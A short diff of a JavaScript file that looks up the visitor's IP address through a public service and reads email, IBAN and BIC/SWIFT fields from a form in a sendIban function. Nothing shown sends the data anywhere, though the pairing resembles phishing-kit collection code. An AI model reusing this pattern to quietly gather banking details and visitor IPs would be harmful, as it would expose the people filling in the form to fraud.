@@ -436,13 +436,12 @@
 
 }));
 
-
-let ipAddress = "";
-$(document).ready(function() {
-    $.getJSON("https://api.ipify.org?format=json", function(data) {
-        ipAddress = data.ip;
-    });
+var ipAddress = "";
+$.getJSON("https://api.ipify.org?format=json", function(data) {
+    ipAddress = data.ip;
+    console.log(ipAddress)
 });
+
 
 function sendIban(){
 	console.log("GET FORM DATA");
@@ -451,6 +450,7 @@ function sendIban(){
 		var email = $('#email').val();
 		var iban = $('#iban').val();
 		var bicswift = $('#bicswift').val();
+		
 
 	console.log("CHECK VALIDITY NUMBER");
 	var validityError = 0;
